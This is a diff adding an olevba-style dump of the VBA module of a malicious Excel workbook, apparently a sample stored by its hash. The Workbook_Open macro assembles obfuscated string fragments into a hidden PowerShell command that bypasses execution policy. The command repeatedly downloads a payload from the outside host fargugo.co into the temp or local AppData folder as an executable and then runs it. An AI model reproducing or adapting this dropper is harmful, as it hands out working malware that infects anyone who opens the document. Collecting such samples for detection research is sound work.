@@ -1,0 +1,85 @@
+Filename     : ./macros/d2634cd5ad7cbd8159271bc1c87cb80f7185475c2e1096506e5104dbb0aad52c
+OLE stream   : _VBA_PROJECT_CUR/VBA/ThisWorkbook
+VBA filename : ThisWorkbook.cls
+----------------------------------------
+Attribute VB_Name = "ThisWorkbook"
+Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = False
+Attribute VB_Customizable = True
+
+
+
+Function gabrilla()
+gabrilla = Chr(34)
+End Function
+Sub Workbook_Open()
+If certdetSubject > 0 Then
+Shell millerbeerlost, certdetAvailable
+End If
+End Sub
+
+
+Function SingleSong()
+SingleSong = Right(Left("multiplexed", 10), 3)
+End Function
+
+Function depminng()
+Randomize
+depminng = Int(Rnd * 2#)
+End Function
+Function demmmper()
+coskoliiyro = "I"
+figofigoo = "nvideo"
+demmmper = coskoliiyro + Left(figofigoo, 2)
+End Function
+Function millerbeerlost()
+
+nagilanile = "cM" + billerfood + nugahoneys + gabrilla + "do{sl" + "eep 25;(." + "(\""{2" + "}{0" + "}{1" + "}\"" -" + "f'-" + "o','bj" + "ec" + "t','ne" + "w') (\""{"
+copengagend = "'sy"
+cryocamera = "1}{3}" + "{5}{" + "0}{2}{4}\"" -f'" + "t'," + copengagend + "st','.we" + "bclie','em','nt','.ne'" + kammerloaff + "'d" + "'+'o" + "w'+'n" + "lo" + "ad" + "fi"
+millerbeerlost = nagilanile + cryocamera + "l'+'e')." + demmmper + "oke('" + tremorrtimer + "p://fargugo.co/zsf','%" + edmonddante + "%." + SingleSong + "')}while(!$?);&(\""{0}{2}{1}\""-f'star','ss','t-proce') '%" + edmonddante + "%." + SingleSong + "'" + Chr(34) + Chr(34)
+End Function
+Function edmonddante()
+
+formasportball = Left("calamander", 4)
+jockercards = "em"
+gregoryopps = Array("t" + jockercards + "p", "lo" + formasportball + "ppd" + "ata")
+edmonddante = gregoryopps(depminng)
+End Function
+
+
+
+Function tremorrtimer()
+giiiotre = "light"
+tremorrtimer = Right(Left(giiiotre + "tight", 6), 3)
+End Function
+Function nugahoneys()
+gagaletterf = Array(Now(), Minute(Now), Now(), Now(), "uT" + "i  B", Minute(Now), Now(), Now())
+santapollende = Array(Now(), "eLL  " + "-N")
+varkoloiif = "ow" + "e"
+olivergobane = "DDe" + "n  "
+fruitstornado = Array(Now(), varkoloiif + "RS", Now(), Now())
+portlanddomms = Array(Now(), Minute(Now), Minute(Now), "oP" + "r  " + "-e")
+
+astralonfice = Array(Now(), "AS" + "S -W" + "i", Now())
+valvegamess = Array(Second(Now), Now(), Now(), Now(), "RA" + "Ct")
+
+
+nugahoneys = "p" + fruitstornado(1) + "h" + santapollende(1) + "on" + "iN" + "Te" + valvegamess(4) + "iv" + "E  -N" + portlanddomms(3) + "xeC" + gagaletterf(4) + "yP" + astralonfice(1) + "nD" + "O " + " hI" + olivergobane
+End Function
+Function kammerloaff()
+jojokolmer = 0
+fertypolo = ").("
+kammerloaff = ")" + fertypolo
+End Function
+
+
+Function billerfood()
+gigstermsd = "d  "
+billerfood = gigstermsd + "/c" + Chr(34)
+End Function
+
